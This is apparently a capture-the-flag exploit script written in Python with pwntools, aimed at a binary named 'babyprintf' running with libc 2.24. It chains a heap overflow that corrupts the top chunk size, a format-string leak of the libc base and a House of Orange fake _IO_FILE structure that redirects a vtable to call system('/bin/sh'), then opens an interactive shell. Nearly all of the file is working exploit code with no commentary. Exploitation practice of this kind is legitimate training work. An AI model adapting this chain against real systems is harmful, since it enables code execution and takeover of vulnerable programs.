#coding=utf8
from pwn import *
# context.log_level = 'debug'
# context.terminal = ['gnome-terminal','-x','bash','-c']
local = 1
if local:
	cn = process('./babyprintf',env={"LD_PRELOAD":"./libc-2.24.so"})
	#bin = ELF('./babyprintf')
	libc = ELF('./libc-2.24.so')
else:
	pass
def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()

def alloc(size,buf=''):
	cn.recvuntil('size: ')
	cn.sendline(str(size))
	cn.recvuntil('string: ')
	cn.sendline(buf)

# modify top chunk size
pay = 'A'*0x18 + '\xe1\x0f'
alloc(8,pay)
# leak && triger _int_free
# cn.interactive()
pay=r'%p%p%p%p%pSTART%pEND'
#z('b*0x0000000000400810\nc')
alloc(0xfff,pay)
cn.recvuntil('START')
leak = cn.recvuntil('END')[:-3]
libc_base = int(leak,16)-libc.symbols['__libc_start_main']-0xf1
_IO_list_all = libc_base+libc.symbols['_IO_list_all']

_IO_str_jumps = libc_base+0x3BE4C0

system = libc_base+libc.symbols['system']
binsh = libc_base+libc.search('/bin/sh\x00').next()
success('libc_base: '+hex(libc_base))
# house of orange
pay = 'A'*0x200
from FILE import *
context.arch = 'amd64'
fake_file = IO_FILE_plus_struct()
fake_file._flags = 0
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base =_IO_list_all-0x10
fake_file._IO_buf_base = binsh
fake_file._mode = 0
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 1
fake_file.vtable = _IO_str_jumps-8
pay+=str(fake_file).ljust(0xe8,'\x00')+p64(system)
alloc(0x200,pay)
# triger OVERFLOW
cn.sendline('1')
cn.interactive()